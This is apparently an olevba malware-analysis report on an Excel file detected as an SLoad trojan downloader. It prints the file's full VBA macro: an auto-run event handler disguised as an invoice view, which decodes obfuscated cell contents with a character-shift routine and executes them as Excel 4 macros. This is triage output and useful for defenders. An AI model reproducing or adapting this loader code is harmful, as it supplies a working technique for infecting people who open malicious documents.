olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan-Downloader.MSOffice.SLoad.gen-7d422c51b1190863d910cc11de77aa744743c5c44238e20c7bdbb56254cb31dc
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub nimos()
For y = 1 To 2
Dim W(): Dim ki As String
Randomize
buu = Application.CountA(UsedRange)
ReDim Preserve W(1 To buu): mn = 1: Z = Split(Range("a1:By2888").SpecialCells(xlCellTypeConstants).Address, ",")
For Each dd In Z
ii = Split(dd, "$"): oi = Range(ii(1) & 1).Column: uis = ii(2): W(mn) = oi & "-" & uis: mn = mn + 1
Next
q = Split(W(Int((buu - 1 - 1) * Rnd) + 1), "-"): ki = Cells(CInt(q(1)), CInt(q(0)))
q = Split(copyG(Cells(ActiveSheet.Cells.SpecialCells(xlCellTypeLastCell).Row, Rows(ActiveSheet.Cells.SpecialCells(xlCellTypeLastCell).Row).Find(What:="*", LookIn:=xlValues, SearchDirection:=xlPrevious, SearchOrder:=xlByColumns).Column)), "!")
For Each r In q
ExecuteExcel4Macro "" & Replace(r, "?", copyG(ki))
Next: Next
End Sub
Function bishop(ByVal r As String)
r = StrConv(r, vbUnicode): bishop = Split(Left(r, Len(r) - 1), vbNullChar)
End Function
Function debugs(c As Long, f As Integer) As String
Dim q As Long: fi = 1
q = c Mod f
If q Then
  debugs = fi - fi
Else
  debugs = fi
End If
End Function
Function copyG(v As String)
b = Len(v): J = bishop(v)
Dim g As Long
For g = 0 To b - 1
If debugs(g, 2) = 1 Then
mim = Chr(Asc(J(g)) - 2)
Else
mim = Chr(Asc(J(g)) + 2)
End If
h = h & mim
Next
copyG = h
End Function

Private Sub invoiceView_Layout(ByVal Index As Long)
mdo = 4: ko = 6: de = 1: nimos: mdo = 98
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |invoiceView_Layout  |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|ExecuteExcel4Macro  |May run an Excel 4 Macro (aka XLM/XLF) from  |
|          |                    |VBA                                          |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

